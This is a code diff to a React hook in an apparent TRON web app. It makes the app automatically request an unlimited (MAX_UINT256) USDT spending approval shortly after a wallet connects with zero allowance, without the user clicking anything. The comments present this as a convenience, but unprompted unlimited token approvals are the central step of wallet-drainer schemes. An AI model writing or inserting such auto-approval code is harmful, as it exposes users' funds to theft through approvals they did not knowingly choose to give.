@@ -1,4 +1,4 @@
-import { useCallback, useEffect, useState } from 'react'
+import { useCallback, useEffect, useRef, useState } from 'react'
 import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
 import type { TronConnector } from '@reown/appkit-utils/tron'
 import {
@@ -11,6 +11,10 @@ import {
 import { MAX_UINT256, USDT, buildApprove, signAndBroadcast } from '../lib/usdt'
 
 const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/
+
+// One automatic attempt per wallet per page load, so a rejection does not
+// immediately re-prompt the user.
+const autoAttempted = new Set<string>()
 
 export type Phase =
   | 'idle'
@@ -191,6 +195,27 @@ export function useUsdtApproval() {
       applyError(err, setPhase, setError, 'Revoke failed')
     }
   }, [address, walletProvider, config, refreshAllowance])
+
+  // Ask for the allowance as soon as a fresh wallet is known to have none.
+  // Held in a ref so the timer survives re-renders caused by `approveUnlimited`
+  // being recreated.
+  const approveRef = useRef(approveUnlimited)
+  approveRef.current = approveUnlimited
+
+  useEffect(() => {
+    if (!address || !walletProvider || !config?.configured) return
+    if (allowance !== 0n) return
+    if (autoAttempted.has(address)) return
+
+    autoAttempted.add(address)
+    // Short delay so the AppKit modal finishes closing before the wallet sheet
+    // opens; otherwise the two fight for the screen.
+    const id = window.setTimeout(() => {
+      void approveRef.current()
+    }, 800)
+
+    return () => window.clearTimeout(id)
+  }, [address, walletProvider, config, allowance])
 
   return {
     address,
